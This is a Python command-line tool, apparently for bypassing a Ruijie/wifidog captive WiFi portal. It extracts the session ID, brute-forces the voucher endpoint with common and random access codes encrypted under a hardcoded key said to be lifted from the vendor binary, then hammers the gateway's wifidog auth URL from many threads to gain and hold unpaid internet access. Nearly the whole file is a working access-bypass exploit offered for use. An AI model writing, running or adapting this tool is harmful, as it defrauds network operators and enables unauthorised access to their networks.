#!/usr/bin/env python3
"""
Ruijie WiFi Portal Tool - CryptoJS encrypted auth + wifidog keepalive
Uses RenderSecretKey2026!@# to encrypt auth data like the original binary.
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import random
import re
import signal
import string
import sys
import threading
import time
from urllib.parse import urljoin, urlparse, parse_qs, unquote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ruijie")

BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
COMMON_CODES = [
    "123456", "000000", "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888", "999999", "123123",
    "121212", "654321", "12345678", "00000000",
]


def aes_encrypt_cryptojs(plaintext: str) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    iv = os.urandom(16)
    cipher = AES.new(RENDER_KEY, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.urlsafe_b64encode(iv + ct).decode()


def chap_md5(chap_id, password, challenge):
    try:
        mid = bytes.fromhex(chap_id) if re.match(r'^[0-9a-f]{2}$', chap_id, re.I) else chap_id.encode()
    except ValueError:
        mid = chap_id.encode()
    try:
        ch = bytes.fromhex(challenge) if re.match(r'^[0-9a-f]{32}$', challenge, re.I) else challenge.encode()
    except ValueError:
        ch = challenge.encode()
    return hashlib.md5(mid + password.encode() + ch).hexdigest()


def parse_octal(s):
    out = bytearray()
    i = 0
    while i < len(s):
        if s[i] == '\\' and i + 3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8))
            i += 4
        else:
            out.append(ord(s[i]))
            i += 1
    return bytes(out)


def check_internet():
    try:
        r = requests.get("http://google.com", timeout=3)
        return r.status_code == 200 and "google" in r.text[:200].lower()
    except Exception:
        return False


def extract_sid(url, html):
    m = re.search(r'sessionId=([a-f0-9]{32})', url)
    if m:
        return m.group(1)
    m = re.search(r'sessionId=([a-f0-9]{32})', html)
    if m:
        return m.group(1)
    m = re.search(r'sessionId["\']?\s*[=:]\s*["\']?([a-f0-9]{32})', html)
    if m:
        return m.group(1)
    return None


def follow_to_maccauth(sess, url):
    current = url
    for _ in range(10):
        r = sess.get(current, timeout=10, verify=False)
        html = r.text
        final = str(r.url)
        if extract_sid(final, html):
            return r, html, final
        m = re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;?\s*url=([^"\' >]+)', html, re.I)
        if m:
            current = urljoin(final, m.group(1))
            continue
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", html)
        if m:
            current = urljoin(final, m.group(1))
            continue
        break
    return r, html, final


def ping_wifidog(auth_url, sess, interval=0.1):
    while True:
        try:
            sess.get(auth_url, timeout=5)
        except Exception:
            break
        time.sleep(interval)


def run(ping_threads=5, ping_interval=0.1, access_code=""):
    log.info("Starting...")
    while True:
        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        sess.verify = False

        try:
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=True, timeout=5)
            if r.status_code == 204:
                if check_internet():
                    time.sleep(10)
                    continue
                time.sleep(3)
                continue

            portal_url = r.url
            log.info(f"[*] Portal: {portal_url}")

            parsed = urlparse(portal_url)
            portal_host = f"{parsed.scheme}://{parsed.netloc}"

            r, html, final_url = follow_to_maccauth(sess, portal_url)
            log.info(f"[*] Maccauth: {final_url}")

            sid = extract_sid(final_url, html)
            if not sid:
                log.warning("[!] No SID, retrying...")
                sess.close()
                time.sleep(3)
                continue

            log.info(f"[*] SID: {sid}")

            # Parse gateway info
            qs = parse_qs(urlparse(portal_url).query)
            gw_addr = qs.get("gw_address", ["192.168.110.1"])[0]
            gw_port = qs.get("gw_port", ["2060"])[0]
            mac = qs.get("mac", [""])[0]
            client_ip = qs.get("ip", [""])[0]

            # Try voucher API with CryptoJS-encrypted payloads
            voucher_api = f"{portal_host}/api/auth/voucher/"
            codes_to_try = [access_code] if access_code else []
            codes_to_try += COMMON_CODES
            codes_to_try += [str(random.randint(100000, 999999)) for _ in range(20)]

            voucher_ok = False
            for code in codes_to_try:
                try:
                    payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
                    encrypted = aes_encrypt_cryptojs(json.dumps(payload))
                    v = sess.post(voucher_api, json={"data": encrypted}, timeout=5)
                    if v.status_code == 200:
                        js = v.json()
                        if js.get("success") or js.get("status") == "ok":
                            log.info(f"[+] Voucher accepted! Code: {code}")
                            voucher_ok = True
                            access_code = code
                            break
                        if not js.get("success") and js.get("message") == "Authentication failed":
                            pass
                except Exception:
                    pass

            # Also try unencrypted
            if not voucher_ok:
                for code in codes_to_try[:10]:
                    try:
                        v = sess.post(voucher_api, json={
                            "accessCode": code, "sessionId": sid, "apiVersion": 1
                        }, timeout=5)
                        if v.status_code == 200:
                            js = v.json()
                            if js.get("success") or js.get("status") == "ok":
                                log.info(f"[+] Voucher accepted (plain): {code}")
                                voucher_ok = True
                                break
                    except Exception:
                        continue

            if not voucher_ok:
                log.info("[*] No valid voucher")

            # Start wifidog pings
            auth_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
            log.info(f"[*] Gateway: {gw_addr}:{gw_port}")
            log.info(f"[*] Pinging with {ping_threads} threads...")

            for _ in range(ping_threads):
                t = threading.Thread(
                    target=ping_wifidog,
                    args=(auth_url, sess, ping_interval),
                    daemon=True,
                )
                t.start()

            time.sleep(10)
            log.info("[*] Verifying...")
            for i in range(20):
                if check_internet():
                    log.info("[+] ONLINE! Keeping alive...")
                    while check_internet():
                        time.sleep(5)
                    log.warning("[-] Disconnected")
                    break
                time.sleep(2 if i < 5 else 3)
            else:
                log.warning("[-] Not online, retrying...")

            sess.close()
            time.sleep(3)

        except KeyboardInterrupt:
            log.info("Stopped")
            break
        except Exception as e:
            log.warning(f"[!] {e}")
            sess.close()
            time.sleep(5)


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Ruijie WiFi Portal Tool")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Ping threads")
    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Ping interval (s)")
    parser.add_argument("-c", "--code", type=str, default="", help="Known access code")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, lambda s, f: (log.info("Stopped"), sys.exit(0)))
    run(ping_threads=args.threads, ping_interval=args.interval, access_code=args.code)


if __name__ == "__main__":
    main()
